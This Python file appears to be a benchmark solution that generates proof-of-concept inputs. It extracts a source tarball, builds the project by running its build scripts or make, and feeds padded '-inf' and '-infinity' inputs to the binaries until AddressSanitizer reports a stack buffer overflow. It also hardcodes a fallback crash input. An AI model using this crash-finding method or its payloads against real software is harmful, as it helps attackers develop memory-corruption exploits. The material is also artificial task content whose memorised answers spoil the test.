import os
import sys
import tarfile
import tempfile
import shutil
import subprocess
import re
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            self._extract_tar_safe(src_path, work_dir)

            # Determine root directory (handle single top-level folder)
            entries = [os.path.join(work_dir, e) for e in os.listdir(work_dir)]
            root_dir = work_dir
            if len(entries) == 1 and os.path.isdir(entries[0]):
                root_dir = entries[0]

            # 1. Try to find an existing PoC file in the tarball
            poc = self._find_existing_poc(root_dir)
            if poc is not None:
                return poc

            # 2. Try to find prebuilt binaries
            binaries = self._find_binaries(root_dir)

            # 3. If no binaries, try to build
            if not binaries:
                self._build_if_needed(root_dir)
                binaries = self._find_binaries(root_dir)

            # 4. If still no binaries, fall back to generic guess
            if not binaries:
                return self._fallback_poc()

            # 5. Prepare candidate inputs based on source inspection
            base_words = self._scan_for_base_words(root_dir)
            candidates = self._generate_candidates(base_words)

            # 6. Search for a crashing input for each binary
            for binary in binaries:
                poc = self._search_crash(binary, candidates)
                if poc is not None:
                    return poc

            # 7. As a last resort, return a generic guess
            return self._fallback_poc()
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    # ---------------- Internal helpers ----------------

    def _extract_tar_safe(self, tar_path: str, dest_dir: str) -> None:
        with tarfile.open(tar_path, "r:*") as tar:
            def is_within_directory(directory: str, target: str) -> bool:
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

            safe_members = []
            for member in tar.getmembers():
                member_path = os.path.join(dest_dir, member.name)
                if is_within_directory(dest_dir, member_path):
                    safe_members.append(member)
            tar.extractall(dest_dir, members=safe_members)

    def _find_existing_poc(self, root_dir: str):
        interesting_keywords = (
            "poc",
            "proof",
            "crash",
            "id:",
            "id_",
            "input",
            "testcase",
            "bug",
            "overflow",
            "stack",
            "42534949",
        )
        ignored_exts = {
            ".c",
            ".cc",
            ".cpp",
            ".cxx",
            ".h",
            ".hh",
            ".hpp",
            ".ipp",
            ".py",
            ".sh",
            ".md",
            ".rst",
            ".yml",
            ".yaml",
            ".json",
            ".toml",
            ".xml",
            ".html",
            ".js",
            ".java",
            ".rb",
            ".go",
            ".rs",
            ".lua",
            ".php",
            ".m",
            ".mm",
            ".in",
            ".ac",
        }
        candidates = []
        max_size = 1_000_000  # 1MB

        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                lower = name.lower()
                if not any(k in lower for k in interesting_keywords):
                    continue
                ext = os.path.splitext(name)[1].lower()
                if ext in ignored_exts:
                    continue
                path = os.path.join(dirpath, name)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > max_size:
                    continue
                candidates.append((st.st_size, path))

        if not candidates:
            return None

        candidates.sort(key=lambda x: x[0])  # smallest first
        for _, path in candidates:
            try:
                with open(path, "rb") as f:
                    data = f.read()
                    if data:
                        return data
            except OSError:
                continue
        return None

    def _find_binaries(self, root_dir: str):
        binaries = []
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                try:
                    with open(path, "rb") as f:
                        header = f.read(4)
                except OSError:
                    continue
                if not header.startswith(b"\x7fELF"):
                    continue
                score = 0
                lower = name.lower()
                if "fuzz" in lower:
                    score += 10
                if "test" in lower or "poc" in lower or "bug" in lower:
                    score += 5
                if "asan" in lower or "san" in lower:
                    score += 3
                if "." not in name:
                    score += 1
                if st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH):
                    score += 2
                binaries.append((-score, path))
        binaries.sort()
        return [p for _, p in binaries]

    def _build_if_needed(self, root_dir: str) -> None:
        # If binaries already exist, don't build
        if self._find_binaries(root_dir):
            return

        # Look for build-related shell scripts (up to depth 2)
        script_candidates = []
        for dirpath, _, filenames in os.walk(root_dir):
            rel = os.path.relpath(dirpath, root_dir)
            depth = 0 if rel == "." else rel.count(os.sep) + 1
            if depth > 2:
                continue
            for name in filenames:
                if not name.endswith(".sh"):
                    continue
                lower = name.lower()
                if "build" in lower or "fuzz" in lower:
                    script_candidates.append(os.path.join(dirpath, name))

        script_candidates.sort(
            key=lambda p: (
                os.path.relpath(os.path.dirname(p), root_dir).count(os.sep),
                0 if os.path.basename(p).lower() == "build.sh" else 1,
            )
        )

        for script in script_candidates:
            try:
                subprocess.run(
                    ["bash", os.path.basename(script)],
                    cwd=os.path.dirname(script),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=300,
                    check=False,
                )
            except Exception:
                continue
            if self._find_binaries(root_dir):
                return

        # Fallback: try make in directories with Makefile (up to depth 2)
        make_dirs = set()
        for dirpath, _, filenames in os.walk(root_dir):
            rel = os.path.relpath(dirpath, root_dir)
            depth = 0 if rel == "." else rel.count(os.sep) + 1
            if depth > 2:
                continue
            if "Makefile" in filenames or "makefile" in filenames:
                make_dirs.add(dirpath)

        for mdir in sorted(make_dirs):
            try:
                subprocess.run(
                    ["make", "-j4"],
                    cwd=mdir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=300,
                    check=False,
                )
            except Exception:
                continue
            if self._find_binaries(root_dir):
                return

    def _scan_for_base_words(self, root_dir: str):
        # Look for "inf" or "infinity" string literals in C/C++ sources
        patterns = [
            re.compile(r'"([^"]*?(?:inf|INF)[^"]*?)"'),
            re.compile(r'"([^"]*?(?:infinity|INFINITY)[^"]*?)"'),
        ]
        base = set()
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".ipp")

        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if not name.endswith(exts):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            for pat in patterns:
                                for m in pat.finditer(line):
                                    s = m.group(1)
                                    if s:
                                        base.add(s)
                except OSError:
                    continue

        if not base:
            base.update(["inf", "infinity", "INF", "Infinity"])

        # Limit to at most 20 distinct base words
        if len(base) > 20:
            base = set(list(base)[:20])

        return list(base)

    def _generate_candidates(self, base_words):
        candidates = []
        seen = set()
        max_candidates = 256

        def add_candidate(data: bytes):
            if data in seen:
                return
            seen.add(data)
            candidates.append(data)

        for word in base_words:
            variants = {word, word.lower(), word.upper(), word.capitalize()}
            for v in variants:
                if not v:
                    continue
                try:
                    w = v.encode("ascii")
                except UnicodeEncodeError:
                    w = v.encode("utf-8", errors="ignore")
                if not w:
                    continue

                # Full word with leading '-'
                payload = b"-" + w
                if len(payload) < 16:
                    payload = payload + b"A" * (16 - len(payload))
                add_candidate(payload[:16])

                # Truncated prefixes to trigger partial infinity parsing
                max_prefix = min(len(w), 8)
                for k in range(1, max_prefix):
                    prefix = w[:k]
                    p = b"-" + prefix
                    if len(p) < 16:
                        p = p + b"B" * (16 - len(p))
                    add_candidate(p[:16])

                # Full word with trailing noise
                add_candidate((b"-" + w + b"A" * 8)[:24])
                add_candidate((b"-" + w + b"0" * 12)[:24])
                add_candidate(b"-" + w + b"\n")

                if len(candidates) >= max_candidates:
                    return candidates

        # Generic fallbacks centered around "-inf" / "-infinity"
        generic = [
            b"-infXXXXXXXXXXXX",     # length 16
            b"-infinityYYYYYY",     # length 16
            b"-INFZZZZZZZZZZ",      # length 13
            b"-INFINITY!!!!!!!!",   # length 16
            b"-infAAAAFFFFBBBB",
        ]
        for g in generic:
            if len(g) < 16:
                g = g + b"A" * (16 - len(g))
            add_candidate(g[:16])
            if len(candidates) >= max_candidates:
                break

        return candidates

    def _is_sanitizer_crash(self, res: subprocess.CompletedProcess) -> bool:
        if res.returncode == 0:
            return False
        stderr = res.stderr
        if not isinstance(stderr, (bytes, bytearray)):
            return False
        text = stderr.decode("utf-8", errors="ignore")
        if "stack-buffer-overflow" in text:
            return True
        if "AddressSanitizer" in text and "overflow" in text:
            return True
        if "runtime error:" in text and "index" in text:
            return True
        return False

    def _search_crash(self, binary: str, candidates):
        bin_dir = os.path.dirname(binary) or None

        for data in candidates:
            # Mode 1: pass input via stdin
            try:
                res = subprocess.run(
                    [binary],
                    input=data,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    cwd=bin_dir,
                    timeout=5,
                    check=False,
                )
                if self._is_sanitizer_crash(res):
                    return data
            except Exception:
                pass

            # Mode 2 and 3: pass input via temporary file argument
            tmp_path = None
            try:
                with tempfile.NamedTemporaryFile(dir=bin_dir, delete=False) as tf:
                    tf.write(data)
                    tf.flush()
                    tmp_path = tf.name

                # 2a: binary <file>
                try:
                    res = subprocess.run(
                        [binary, tmp_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        cwd=bin_dir,
                        timeout=5,
                        check=False,
                    )
                    if self._is_sanitizer_crash(res):
                        return data
                except Exception:
                    pass

                # 2b: binary -runs=1 <file>  (for libFuzzer-style harnesses)
                try:
                    res = subprocess.run(
                        [binary, "-runs=1", tmp_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        cwd=bin_dir,
                        timeout=5,
                        check=False,
                    )
                    if self._is_sanitizer_crash(res):
                        return data
                except Exception:
                    pass
            finally:
                if tmp_path is not None:
                    try:
                        os.unlink(tmp_path)
                    except OSError:
                        pass

        return None

    def _fallback_poc(self) -> bytes:
        # Generic guess focusing on the described pattern:
        # leading '-' followed by an attempt to parse infinity.
        return b"-infAAAAAAAAAAAA"